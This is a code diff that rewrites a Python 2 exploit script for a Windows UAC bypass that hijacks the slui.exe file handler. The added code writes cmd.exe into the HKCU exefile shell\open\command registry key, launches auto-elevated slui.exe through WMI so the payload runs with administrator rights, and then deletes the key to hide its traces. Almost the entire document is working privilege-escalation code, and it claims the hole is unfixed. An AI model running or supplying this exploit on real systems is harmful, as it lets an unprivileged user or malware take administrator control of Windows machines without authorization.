@@ -1,45 +1,78 @@
 """
-https://github.com/bytecode-77/slui-file-handler-hijack-privilege-escalation/
-	
-slui.exe is an auto-elevated binary that is vulnerable to file handler hijacking
-Read access to HKCU\Software\Classes\exefile\shell\open is performed upon         
-execution. Due to the registry key being accessible from user mode, an arbitrary 
-executable file can be provided. 
+Works from: Windows 8.1 (9600)
+Fixed in: unfixed
 """
 import os
-import sys
+import wmi
 import time
 import _winreg
-import win32api
 import win32con
+from colorama import init, Fore
+init(convert=True)
 
-def cmd_path():
-	path = "c:/windows/system32/cmd.exe"
+wmi = wmi.WMI()
 
-	if os.path.isfile(os.path.join(path)) == True:
-		return os.path.join(path)
-	else:
+payload = "c:\\windows\\system32\\cmd.exe"
+
+def successBox():
+	return (Fore.GREEN + '[+]' + Fore.RESET)
+	
+def errorBox():
+	return (Fore.RED + '[-]' + Fore.RESET)
+
+def infoBox():
+	return (Fore.CYAN + '[!]' + Fore.RESET)	
+	
+def warningBox():
+	return (Fore.YELLOW + '[!]' + Fore.RESET)
+
+def slui():
+	print " {} slui: Attempting to create registry key".format(infoBox())
+	try:
+		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
+					os.path.join("Software\Classes\exefile\shell\open\command"))
+								
+		_winreg.SetValueEx(key,
+				None,
+				0,
+				_winreg.REG_SZ,
+				payload)
+
+		_winreg.SetValueEx(key,
+				"DelegateExecute",
+				0,
+				_winreg.REG_SZ,
+				None)
+
+		_winreg.CloseKey(key)
+		print " {} slui: Registry key created".format(successBox())
+	except Exception as error:
+		print " {} slui: Unable to create key".format(errorBox())
 		return False
 
-def slui_file_hijack():
-	if (os.path.isfile(os.path.join("c:\windows\system32\slui.exe")) == True):
-		try:
-			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\exefile\shell\open\command")
-			_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,cmd_path())
-			_winreg.CloseKey(key)
-		except Exception as error:
-			return False
+	print " {} slui: Pausing for 5 seconds before executing".format(infoBox())
+	time.sleep(5)
 
-		try:
-			win32api.ShellExecute(0,None,"c:\windows\system32\slui.exe",None,None,win32con.SW_HIDE)
-		except Exception as error:
-			sys.exit()
+	print " {} slui: Attempting to create process".format(infoBox())
+	try:
+		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start slui.exe",
+										ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+		if (result[1] == 0):
+			print " {} slui: Process started successfully".format(successBox())
+		else:
+			print " {} slui: Problem creating process".format(errorBox())
+	except Exception as error:
+		print " {} slui: Problem creating process".format(errorBox())
+		return False
 
-		time.sleep(5)
-			
-		try:
-			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\exefile\shell")
-		except Exception as error:
-			return False
-	else:
-		sys.eixt()
+	print " {} slui: Pausing for 5 seconds before cleaning".format(infoBox())
+	time.sleep(5)
+
+	print " {} slui: Attempting to remove registry key".format(infoBox())
+	try:
+		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
+							os.path.join("Software\Classes\exefile\shell\open\command"))
+		print " {} slui: Registry key was deleted".format(successBox())					
+	except Exception as error:
+		print " {} slui: Unable to delete key".format(errorBox())
+		return False
